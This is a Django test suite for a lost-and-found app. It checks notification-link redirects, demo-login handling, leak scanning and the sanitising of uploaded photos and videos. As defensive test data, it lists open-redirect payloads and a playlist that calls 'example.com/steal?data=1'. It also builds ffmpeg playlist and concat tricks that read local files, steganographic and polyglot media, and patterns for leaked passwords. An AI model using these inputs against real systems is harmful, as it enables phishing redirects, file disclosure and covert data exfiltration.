"""v1.1.2 tests: BUG-008, BUG-010, SEC-001, SEC-002, CHG-008 (demo sign-ins per PC, no sensitive data in shared files). All people here are fictional."""
import os
import re
import subprocess
from io import StringIO
from pathlib import Path

from django.conf import settings
from django.contrib.auth import get_user_model
from django.core.management import call_command
from django.test import SimpleTestCase, TestCase, override_settings
from django.urls import reverse

from core import demo_logins
from core.models import Category, InAppNotification, ItemPost
from core.security import is_own_site_path
from core.verification import notify_account

from .base import FindItTestCase

User = get_user_model()


class PostDetailTagLineTests(FindItTestCase):
    """BUG-008: category link uses the id and shows the name; location stays dormant."""

    def test_category_link_uses_id_and_shows_name(self):
        post = self.create_post()
        html = self.client_for(self.alice).get(reverse("post-detail", args=[post.pk])).content.decode()
        self.assertIn(f'href="{reverse("home")}?category={self.category.pk}">{self.category.name}</a>', html)

    def test_category_link_filters_browse(self):
        post = self.create_post()
        other_category = Category.objects.exclude(pk=self.category.pk).first()
        other = self.create_post(category=other_category.pk)
        response = self.client_for(self.alice).get(f"{reverse('home')}?category={self.category.pk}")
        self.assertContains(response, reverse("post-detail", args=[post.pk]))
        self.assertNotContains(response, reverse("post-detail", args=[other.pk]))

    @override_settings(FINDIT_LOCATION_ENABLED=False)
    def test_dormant_location_hidden(self):
        post = self.create_post()
        ItemPost.objects.filter(pk=post.pk).update(location="Library 2nd floor")
        response = self.client_for(self.alice).get(reverse("post-detail", args=[post.pk]))
        self.assertNotContains(response, "Library 2nd floor")

    @override_settings(FINDIT_LOCATION_ENABLED=True)
    def test_location_shown_when_enabled(self):
        post = self.create_post()
        ItemPost.objects.filter(pk=post.pk).update(location="Library 2nd floor")
        response = self.client_for(self.alice).get(reverse("post-detail", args=[post.pk]))
        self.assertContains(response, "📍 Library 2nd floor")

    def test_post_without_category_has_no_empty_link(self):
        post = self.create_post()
        ItemPost.objects.filter(pk=post.pk).update(category=None)
        response = self.client_for(self.alice).get(reverse("post-detail", args=[post.pk]))
        self.assertNotContains(response, 'class="category-tag"')


class NotificationLinkTests(FindItTestCase):
    """SEC-002: tapping a notice never leaves Find-IT."""

    UNSAFE = [
        "https://evil.example.com/", "http://evil.example.com", "//evil.example.com/", "/\\evil.example.com",
        "/\\/evil.example.com", "\\\\evil.example.com", "javascript:alert(1)", "/\t/evil.example.com",
        "/%0a/evil.example.com\n", "evil.example.com", " /home/",
    ]

    def open_notice(self, link):
        notice = InAppNotification.objects.create(recipient=self.alice, text="Test notice", link=link)
        return self.client_for(self.alice).get(f"{reverse('notifications')}?open={notice.pk}")

    def test_own_page_link_opens(self):
        response = self.open_notice(reverse("my-profile"))
        self.assertRedirects(response, reverse("my-profile"), fetch_redirect_response=False)

    def test_other_website_links_never_redirect_away(self):
        for link in self.UNSAFE:
            with self.subTest(link=link):
                self.assertFalse(is_own_site_path(link))
                response = self.open_notice(link)
                self.assertEqual(response.status_code, 302)
                self.assertEqual(response["Location"], reverse("notifications"))

    def test_unsafe_link_is_not_stored(self):
        notice = notify_account(self.alice, "Hello", link="//evil.example.com/")
        self.assertEqual(notice.link, "")
        notice = notify_account(self.alice, "Hello again", link=reverse("home"))
        self.assertEqual(notice.link, reverse("home"))


class DemoLoginsTests(FindItTestCase):
    """CHG-008: demo passwords are random per PC, saved only in demo-logins.txt (ignored by Git)."""

    def setUp(self):
        # No super().setUp(): seed_demo makes its own demo accounts.
        import tempfile
        self.folder = tempfile.mkdtemp(prefix="findit-demo-")
        self.file = os.path.join(self.folder, "demo-logins.txt")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.folder, ignore_errors=True)
        super().tearDown()

    def seed(self, *args):
        with override_settings(DEBUG=True, FINDIT_DEMO_LOGINS_FILE=self.file,
                               FINDIT_TESTER_ACCOUNTS_FILE=os.path.join(self.folder, "tester-accounts.txt")):
            call_command("seed_demo", *args, stdout=StringIO())
            return demo_logins.load()

    def test_random_passwords_saved_and_working(self):
        logins = self.seed()
        self.assertEqual(len(logins), 10)  # 8 demo accounts + the 2 v2.0.0 examples (Drew, Morgan); no tester file here
        self.assertEqual(len(set(logins.values())), 10)  # every account gets its own
        for username, password in logins.items():
            self.assertRegex(password, r"^[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}$")
            self.assertTrue(User.objects.get(username=username).check_password(password), username)
        response = self.client.post(reverse("login"), {"username": "alex.finder@example.com", "password": logins["2026-0001"]})
        self.assertEqual(response.status_code, 302)

    def test_running_again_keeps_the_same_passwords(self):
        first = self.seed()
        self.assertEqual(self.seed(), first)

    def test_old_published_password_is_replaced(self):
        self.seed()
        user = User.objects.get(username="security.demo")
        old = "Demo" + "Staff!" + "2026"  # the old public password, built so it is not written in the code
        user.set_password(old)
        user.save()
        logins = self.seed("--logins-only")
        self.assertFalse(User.objects.get(username="security.demo").check_password(old))
        self.assertTrue(User.objects.get(username="security.demo").check_password(logins["security.demo"]))

    def test_logins_only_without_file_resets_passwords_and_keeps_data(self):
        self.seed()
        posts = ItemPost.objects.count()
        users = User.objects.count()
        os.remove(self.file)
        logins = self.seed("--logins-only")
        self.assertEqual(len(logins), 10)
        self.assertTrue(User.objects.get(username="2026-0017").check_password(logins["2026-0017"]))
        self.assertEqual(User.objects.count(), users)
        self.assertEqual(ItemPost.objects.count(), posts)
        self.assertTrue(User.objects.get(username="2026-0002").check_password(logins["2026-0002"]))


class NoSensitiveDataInSharedFilesTests(SimpleTestCase):
    """Owner's rule (v1.1.2): the shared repository never contains demo passwords or
    Developer-account instructions. This scans every file Git tracks."""

    PATTERNS = [
        (re.compile(r"Demo(FindIt|Staff|Admin)!\d{4}"), "an old published demo password"),
        (re.compile(r"create_developer"), "Developer account instructions"),
    ]
    # Code that must name the command itself (the program needs it).
    ALLOWED = {
        "create_developer": {
            "core/management/commands/create_developer.py", "core/tests/test_v111.py", "FindIT.cmd",
            "core/tests/test_v112.py", "core/forms.py", "core/models.py", "core/views.py", "core/permissions.py",
            "core/signals.py",
        },
    }

    def test_no_leaks(self):
        root = Path(settings.BASE_DIR)
        if (root / "PRIVATE-NOTES.md").exists():
            self.skipTest("This is the owner's private copy, which is meant to hold the private notes.")
        try:
            files = subprocess.run(["git", "ls-files"], cwd=root, capture_output=True, text=True, check=True).stdout.split()
        except (OSError, subprocess.CalledProcessError):
            self.skipTest("Git is not available in this folder.")
        self.assertNotIn("demo-logins.txt", files)
        # CHG-014: tester accounts are sensitive and stay in the owner's private copy only
        for private in ("tester-accounts.txt", "tester-passwords.txt", "accounts.md"):
            self.assertFalse([f for f in files if f.lower().endswith(private)], private)
        self.assertFalse([f for f in files if f.startswith("Accounts/")], "Accounts/")
        problems = []
        for name in files:
            path = root / name
            if path.suffix.lower() in {".png", ".jpg", ".jpeg", ".webp", ".ico", ".mp4", ".pdf", ".woff", ".woff2"}:
                continue
            try:
                text = path.read_text(encoding="utf-8")
            except (UnicodeDecodeError, OSError):
                continue
            for pattern, what in self.PATTERNS:
                if pattern.search(text) and name not in self.ALLOWED.get(pattern.pattern, set()):
                    problems.append(f"{name}: {what}")
        self.assertEqual(problems, [], "Sensitive data in shared files (move it to the owner's private copy)")


class StaticFileTypeTests(TestCase):
    """BUG-010: the design (CSS) and scripts keep their correct type even when a Windows PC's
    registry says .css/.js are plain text (browsers refuse a stylesheet sent as text/plain)."""

    def serve(self, path):
        from django.contrib.staticfiles.views import serve
        from django.test import RequestFactory
        with override_settings(DEBUG=True):
            response = serve(RequestFactory().get(f"/static/{path}"), path)
        response.close()
        return response["Content-Type"]

    def test_broken_registry_types_are_corrected(self):
        import mimetypes
        from core.apps import use_standard_file_types
        try:
            mimetypes.add_type("text/plain", ".css")  # what a broken Windows registry does
            mimetypes.add_type("text/plain", ".js")
            self.assertTrue(self.serve("css/findit.css").startswith("text/plain"))  # the bug, reproduced
            use_standard_file_types()  # what Find-IT does when it starts
            self.assertTrue(self.serve("css/findit.css").startswith("text/css"))
            self.assertTrue(self.serve("js/app.js").startswith("text/javascript"))
        finally:
            use_standard_file_types()

    def test_pages_link_the_stylesheet(self):
        from django.test import Client
        html = Client().get(reverse("login")).content.decode()
        self.assertIn('rel="stylesheet" href="/static/css/findit.css', html)


# ---------------------------------------------------------------------------
# SEC-001: hidden data inside photos and videos becomes plain pixels
# ---------------------------------------------------------------------------
SECRET = b"KEYLOGGER-SECRET-PAYLOAD-2020-0001"


def _message_bits(length):
    """A fixed, recognisable bit pattern (the 'hidden message')."""
    data = (SECRET * (length // (len(SECRET) * 8) + 1))
    return [(data[i // 8] >> (7 - i % 8)) & 1 for i in range(length)]


def _picture_with_lsb_message(size=(320, 240)):
    """A photo whose lowest bit of every red value carries SECRET (classic LSB steganography)."""
    import random
    from PIL import Image
    rng = random.Random(7)
    width, height = size
    bits = _message_bits(width * height)
    pixels = []
    for index in range(width * height):
        red = (rng.randrange(40, 216) & 0xFE) | bits[index]
        pixels.append((red, rng.randrange(40, 216), rng.randrange(40, 216)))
    image = Image.new("RGB", size)
    image.putdata(pixels)
    return image, bits


def _lsb_match(image, bits):
    """Share of red lowest bits that still equal the hidden message (0.5 = pure chance)."""
    red = list(image.convert("RGB").getdata(band=0))
    same = sum(1 for value, bit in zip(red, bits) if (value & 1) == bit)
    return same / len(bits)


class Sec001PhotoTests(FindItTestCase):
    def png_bytes(self, image):
        import io
        buffer = io.BytesIO()
        image.save(buffer, "PNG")
        return buffer.getvalue()

    def stored(self, data, preset=None):
        import io
        from core.images import FULL, compress
        return compress(io.BytesIO(data), **(preset or FULL))

    def test_pixel_steganography_does_not_survive(self):
        import io
        from PIL import Image
        image, bits = _picture_with_lsb_message()
        self.assertEqual(_lsb_match(image, bits), 1.0)  # the message is really there before
        out = Image.open(io.BytesIO(self.stored(self.png_bytes(image))))
        self.assertEqual(out.size, image.size)
        self.assertLess(abs(_lsb_match(out, bits) - 0.5), 0.05)  # after: only chance remains

    def test_scramble_is_invisible(self):
        from PIL import ImageChops, ImageStat
        from core.images import scramble_lowest_bits
        image, _ = _picture_with_lsb_message()
        difference = ImageChops.difference(image, scramble_lowest_bits(image))
        self.assertLessEqual(max(high for _, high in difference.getextrema()), 3)  # at most 3 of 255 steps
        self.assertLess(max(ImageStat.Stat(difference).mean), 2)

    def test_appended_zip_metadata_and_profile_removed(self):
        import io
        from PIL import Image
        from PIL.ImageCms import ImageCmsProfile, createProfile
        image, _ = _picture_with_lsb_message()
        exif = Image.Exif()
        exif[0x010E] = SECRET.decode()  # ImageDescription
        exif[0x9286] = SECRET.decode()  # UserComment
        buffer = io.BytesIO()
        icc = ImageCmsProfile(createProfile("sRGB")).tobytes()
        image.save(buffer, "JPEG", exif=exif, icc_profile=icc, comment=SECRET)
        hostile = buffer.getvalue() + b"PK\x03\x04" + SECRET + b"\x00" * 500
        data = self.stored(hostile)
        self.assertNotIn(SECRET, data)
        self.assertNotIn(b"PK\x03\x04", data)
        self.assertNotIn(b"Exif", data)
        self.assertTrue(data.startswith(b"\xff\xd8") and data.endswith(b"\xff\xd9"))
        info = Image.open(io.BytesIO(data)).info
        for key in ("exif", "icc_profile", "comment"):
            self.assertNotIn(key, info)

    def test_other_picture_formats_are_never_opened(self):
        import io
        from PIL import Image
        from core.validators import validate_photo
        from django.core.exceptions import ValidationError
        from django.core.files.uploadedfile import SimpleUploadedFile
        for fmt in ("BMP", "TIFF", "GIF"):
            with self.subTest(fmt=fmt):
                buffer = io.BytesIO()
                Image.new("RGB", (40, 30), (10, 20, 30)).save(buffer, fmt)
                with self.assertRaises(Exception):
                    self.stored(buffer.getvalue())
                disguised = SimpleUploadedFile("item.png", buffer.getvalue(), content_type="image/png")
                with self.assertRaises(ValidationError):
                    validate_photo(disguised)

    def test_post_with_disguised_picture_gets_a_friendly_error(self):
        import io
        from PIL import Image
        from django.core.files.uploadedfile import SimpleUploadedFile
        buffer = io.BytesIO()
        Image.new("RGB", (40, 30)).save(buffer, "BMP")
        fake = SimpleUploadedFile("item.png", buffer.getvalue(), content_type="image/png")
        response = self.client_for(self.finder).post(
            "/posts/new/", {"post_type": "FOUND", "category": self.category.pk, "photos": [fake]})
        self.assertEqual(response.status_code, 200)  # the form again, with a message - not an error page
        self.assertContains(response, "JPG, PNG, WebP or AVIF")

    def test_post_photo_and_preview_are_clean(self):
        image, bits = _picture_with_lsb_message()
        from django.core.files.uploadedfile import SimpleUploadedFile
        upload = SimpleUploadedFile("item.png", self.png_bytes(image), content_type="image/png")
        post = self.create_post(photos=[upload])
        photo = post.photos.get()
        for field in (photo.image, photo.preview):
            with field.open("rb") as handle:
                data = handle.read()
            self.assertTrue(data.startswith(b"\xff\xd8") and data.endswith(b"\xff\xd9"))
            self.assertNotIn(SECRET, data)


def _ffmpeg():
    from core.chat_media import _ffmpeg as find
    return find()


def _run_ffmpeg(*args):
    import subprocess
    subprocess.run([_ffmpeg(), "-hide_banner", "-loglevel", "error", "-y", *args], check=True, capture_output=True)


@override_settings(PRIVATE_MEDIA_ROOT=__import__("tempfile").mkdtemp(prefix="findit-test-private-"))
class Sec001VideoTests(FindItTestCase):
    """Chat videos: extra streams, metadata, appended files, playlists and pixel bits."""

    def setUp(self):
        super().setUp()
        import tempfile
        from core.models import Conversation
        self.work = tempfile.mkdtemp(prefix="findit-sec001-")
        post = self.create_post(self.finder)
        self.claim(post, self.alice)
        self.conversation = Conversation.objects.get(claim__claimant=self.alice)

    def tearDown(self):
        import shutil
        shutil.rmtree(self.work, ignore_errors=True)
        super().tearDown()

    def path(self, name):
        return os.path.join(self.work, name)

    def process(self, data, name):
        """Upload through the real chat route and run the video worker; return (attachment, stored bytes)."""
        from django.core.files.uploadedfile import SimpleUploadedFile
        from core.chat_media import run_pending
        from core.models import ChatAttachment
        upload = SimpleUploadedFile(name, data, content_type="video/mp4")
        self.client_for(self.alice).post(
            f"/conversations/{self.conversation.pk}/attachments/", {"file": upload, "client_id": name})
        run_pending()
        attachment = ChatAttachment.objects.get(client_id=name)
        stored = b""
        if attachment.file:
            with attachment.file.open("rb") as handle:
                stored = handle.read()
        return attachment, stored

    def read(self, name):
        with open(self.path(name), "rb") as handle:
            return handle.read()

    def test_extra_streams_and_metadata_are_dropped(self):
        with open(self.path("subs.srt"), "wb") as handle:
            handle.write(b"1\n00:00:00,000 --> 00:00:02,000\n" + SECRET + b"\n")
        with open(self.path("secret.txt"), "wb") as handle:
            handle.write(SECRET * 20)
        _run_ffmpeg(
            "-f", "lavfi", "-i", "testsrc=size=320x240:rate=24:duration=2", "-f", "lavfi", "-i", "sine=d=2",
            "-i", self.path("subs.srt"), "-map", "0", "-map", "1", "-map", "2",
            "-attach", self.path("secret.txt"), "-metadata:s:t", "mimetype=text/plain",
            "-metadata", f"title={SECRET.decode()}", "-metadata", f"comment={SECRET.decode()}",
            "-c:v", "libx264", "-preset", "ultrafast", "-c:a", "aac", "-c:s", "srt", self.path("hostile.mkv"))
        hostile = self.read("hostile.mkv")
        self.assertIn(SECRET, hostile)
        attachment, stored = self.process(hostile, "hostile.mkv")
        self.assertEqual(attachment.status, "READY", attachment.error)
        self.assertNotIn(SECRET, stored)
        report = _report(stored, self.work)
        self.assertEqual(len(re.findall(r"Stream #0:\d", report)), 2)  # video + audio only
        self.assertNotIn("Subtitle", report)
        self.assertNotIn("Attachment", report)

    def test_appended_zip_is_removed(self):
        _run_ffmpeg("-f", "lavfi", "-i", "testsrc=size=320x240:rate=24:duration=2", "-c:v", "libx264",
                    "-preset", "ultrafast", "-pix_fmt", "yuv420p", self.path("clip.mp4"))
        hostile = self.read("clip.mp4") + b"PK\x03\x04" + SECRET + b"\x00" * 1000
        attachment, stored = self.process(hostile, "clip.mp4")
        self.assertEqual(attachment.status, "READY", attachment.error)
        self.assertNotIn(SECRET, stored)
        self.assertNotIn(b"PK\x03\x04", stored)

    def test_playlist_and_concat_files_are_refused(self):
        from core.models import ChatAttachment
        with open(self.path("secret-target.txt"), "wb") as handle:
            handle.write(SECRET)
        tricks = {
            "playlist.mp4": f"#EXTM3U\n#EXT-X-TARGETDURATION:2\n#EXTINF:2,\n{self.path('secret-target.txt')}\n#EXT-X-ENDLIST\n",
            "remote.mp4": "#EXTM3U\n#EXTINF:2,\nhttp://example.com/steal?data=1\n#EXT-X-ENDLIST\n",
            "concat.mkv": f"ffconcat version 1.0\nfile '{self.path('secret-target.txt')}'\n",
        }
        for name, text in tricks.items():
            with self.subTest(name=name):
                attachment, stored = self.process(text.encode(), name)
                self.assertEqual(attachment.status, ChatAttachment.Status.FAILED)
                self.assertEqual(stored, b"")

    def test_hidden_bits_in_frames_do_not_survive(self):
        import subprocess
        image, bits = _picture_with_lsb_message()
        raw = image.tobytes()
        subprocess.run([_ffmpeg(), "-hide_banner", "-loglevel", "error", "-y", "-f", "rawvideo", "-pix_fmt", "rgb24",
                        "-s", "320x240", "-r", "24", "-i", "-", "-frames:v", "24", "-c:v", "ffv1", self.path("lossless.mkv")],
                       input=raw * 24, check=True, capture_output=True)
        attachment, stored = self.process(self.read("lossless.mkv"), "lossless.mkv")
        self.assertEqual(attachment.status, "READY", attachment.error)
        with open(self.path("stored.mp4"), "wb") as handle:
            handle.write(stored)
        frame = subprocess.run([_ffmpeg(), "-hide_banner", "-loglevel", "error", "-i", self.path("stored.mp4"),
                                "-frames:v", "1", "-f", "rawvideo", "-pix_fmt", "rgb24", "-"],
                               check=True, capture_output=True).stdout
        from PIL import Image
        decoded = Image.frombytes("RGB", (320, 240), frame[: 320 * 240 * 3])
        self.assertLess(abs(_lsb_match(decoded, bits) - 0.5), 0.05)

    def test_poster_is_a_clean_jpeg(self):
        _run_ffmpeg("-f", "lavfi", "-i", "testsrc=size=320x240:rate=24:duration=2", "-c:v", "libx264",
                    "-preset", "ultrafast", "-pix_fmt", "yuv420p", self.path("clip.mp4"))
        attachment, _ = self.process(self.read("clip.mp4"), "clip2.mp4")
        with attachment.preview.open("rb") as handle:
            poster = handle.read()
        self.assertTrue(poster.startswith(b"\xff\xd8") and poster.endswith(b"\xff\xd9"))


def _report(data, folder):
    from core.chat_media import _ffmpeg as find, _report as probe
    path = os.path.join(folder, "check.mp4")
    with open(path, "wb") as handle:
        handle.write(data)
    return probe(find(), path, "mov")
